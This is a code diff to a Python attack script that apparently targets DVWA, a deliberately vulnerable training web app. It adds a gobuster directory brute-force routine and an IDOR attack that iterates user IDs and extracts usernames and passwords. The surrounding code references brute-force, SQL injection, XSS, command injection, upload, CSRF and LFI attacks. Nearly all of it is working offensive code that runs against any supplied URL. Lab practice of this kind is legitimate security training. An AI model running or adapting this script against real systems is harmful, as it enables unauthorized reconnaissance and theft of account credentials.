@@ -77,6 +77,106 @@ def reconnaissance(url):
         target_url = f"{url}/{path}"
         resp = session.get(target_url)
         print(f"{target_url} => {resp.status_code}")
+    
+    # Check if the user wants a more thorough directory scan using gobuster
+    gobuster_scan(url)
+
+def gobuster_scan(url):
+    """Perform thorough directory brute force using gobuster"""
+    print("\n[+] Attempting to run gobuster for thorough directory enumeration...")
+    
+    # Check if gobuster is installed
+    try:
+        if os.name == 'nt':  # Windows
+            result = subprocess.run(['where', 'gobuster'], capture_output=True, text=True)
+        else:  # Unix-like
+            result = subprocess.run(['which', 'gobuster'], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout.strip():
+            print(f"[i] Gobuster is installed at: {result.stdout.strip()}")
+        else:
+            raise FileNotFoundError("Gobuster not found in PATH")
+    except Exception as e:
+        print(f"[!] Gobuster verification failed: {e}")
+        print("[!] Please ensure Gobuster is properly installed and in your PATH.")
+        print("    Install with: 'go install github.com/OJ/gobuster/v3@latest' or")
+        print("    'sudo apt install gobuster' on Debian/Ubuntu or equivalent.")
+        return False
+    
+    # Common directory wordlist locations
+    wordlists = [
+        "/usr/share/wordlists/dirb/common.txt",
+        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
+        "/usr/share/seclists/Discovery/Web-Content/common.txt"
+    ]
+    
+    # Find a wordlist that exists
+    wordlist_path = None
+    for wl in wordlists:
+        if os.path.exists(wl):
+            wordlist_path = wl
+            break
+    
+    if not wordlist_path:
+        print("[!] No suitable wordlist found. Creating a basic wordlist...")
+        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tmp_wl:
+            # Write some common directories to try
+            common_dirs = [
+                "admin", "login", "wp-admin", "backup", "config", "db", "sql",
+                "phpmyadmin", "mysql", "administrator", "images", "uploads",
+                "files", "private", "secret", "passwords", "logs", "scripts",
+                "test", "dev", "development", "api", "inc", "includes", "setup",
+                "install", "cgi-bin", "assets"
+            ]
+            for d in common_dirs:
+                tmp_wl.write(f"{d}\n")
+            wordlist_path = tmp_wl.name
+            print(f"[i] Created temporary wordlist at: {wordlist_path}")
+    
+    # Parse the URL to ensure we get the base URL correctly
+    from urllib.parse import urlparse
+    parsed_url = urlparse(url)
+    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+    
+    # Run gobuster
+    try:
+        # Basic gobuster dir command
+        gobuster_cmd = [
+            "gobuster", "dir",
+            "-u", base_url,
+            "-w", wordlist_path,
+            "-t", "10",  # 10 threads
+            "-o", f"gobuster_results_{parsed_url.netloc.replace(':', '_')}.txt"
+        ]
+        
+        print(f"[i] Running gobuster: {' '.join(gobuster_cmd)}")
+        process = subprocess.run(gobuster_cmd, capture_output=True, text=True, timeout=180)
+        
+        # Print results
+        if process.returncode == 0:
+            print("[+] Gobuster completed successfully. Results:")
+            for line in process.stdout.splitlines():
+                if "Status: 200" in line or "Status: 301" in line or "Status: 302" in line:
+                    print(f"    {line}")
+            
+            output_file = f"gobuster_results_{parsed_url.netloc.replace(':', '_')}.txt"
+            print(f"[i] Full results saved to: {output_file}")
+            return True
+        else:
+            print(f"[!] Gobuster returned non-zero exit code: {process.returncode}")
+            print(f"[!] Error: {process.stderr}")
+            return False
+    except subprocess.TimeoutExpired:
+        print("[!] Gobuster scan timed out after 180 seconds.")
+    except Exception as e:
+        print(f"[!] Error running gobuster: {e}")
+    finally:
+        # Clean up if we created a temporary wordlist
+        if not any(wordlist_path == wl for wl in wordlists) and os.path.exists(wordlist_path):
+            os.remove(wordlist_path)
+            print(f"[i] Removed temporary wordlist: {wordlist_path}")
+    
+    return False
 
 def brute_force(url, use_hydra=False):
     """Perform brute force attack using either Python or Hydra"""
@@ -334,6 +434,38 @@ def lfi(url):
     else:
         print("[-] LFI failed or not vulnerable at low security.")
 
+def idor(url):
+    """Test Insecure Direct Object Reference vulnerability"""
+    print("\n[+] Attempting IDOR attack...")
+    
+    # Try to access different user IDs
+    for user_id in range(1, 5):  # Try user IDs 1 through 4
+        idor_url = f"{url}/vulnerabilities/authbypass/?id={user_id}"
+        print(f"[i] Attempting to access user ID: {user_id}")
+        r = session.get(idor_url)
+        
+        # Look for successful indicators (may vary depending on DVWA implementation)
+        if 'Username:' in r.text and 'Password:' in r.text:
+            print(f"[!] IDOR successful for user ID {user_id}!")
+            print(f"[+] Response content:")
+            
+            # Extract and display sensitive information
+            import re
+            username_match = re.search(r'Username: ([^<]+)', r.text)
+            password_match = re.search(r'Password: ([^<]+)', r.text)
+            
+            if username_match and password_match:
+                username = username_match.group(1).strip()
+                password = password_match.group(1).strip()
+                print(f"    Username: {username}")
+                print(f"    Password: {password}")
+            else:
+                print("    [Could not extract username/password from response]")
+        else:
+            print(f"[-] No sensitive data found for user ID {user_id}")
+    
+    return True
+
 def logout(url):
     """Log out from DVWA"""
     print("\n[+] Logging out...")
@@ -355,8 +487,9 @@ def main():
     parser.add_argument("--username", default=DEFAULT_USERNAME, help=f"Username (default: {DEFAULT_USERNAME})")
     parser.add_argument("--password", default=DEFAULT_PASSWORD, help=f"Password (default: {DEFAULT_PASSWORD})")
     parser.add_argument("--hydra", action="store_true", help="Use Hydra for brute force (default: Python)")
+    parser.add_argument("--gobuster", action="store_true", help="Run thorough directory enumeration with gobuster")
     parser.add_argument("--attacks", default="all", 
-                        choices=["all", "recon", "brute", "sqli", "xss", "cmdi", "upload", "csrf", "lfi"],
+                        choices=["all", "recon", "brute", "sqli", "xss", "cmdi", "upload", "csrf", "lfi", "idor"],
                         help="Specific attack to run (default: all)")
     
     args = parser.parse_args()
@@ -401,6 +534,13 @@ def main():
     
     if args.attacks in ["all", "lfi"]:
         lfi(args.url)
+        
+    if args.attacks in ["all", "idor"]:
+        idor(args.url)
+    
+    # If --gobuster is specified, run gobuster separately
+    if args.gobuster:
+        gobuster_scan(args.url)
     
     # Always logout at the end
     logout(args.url)
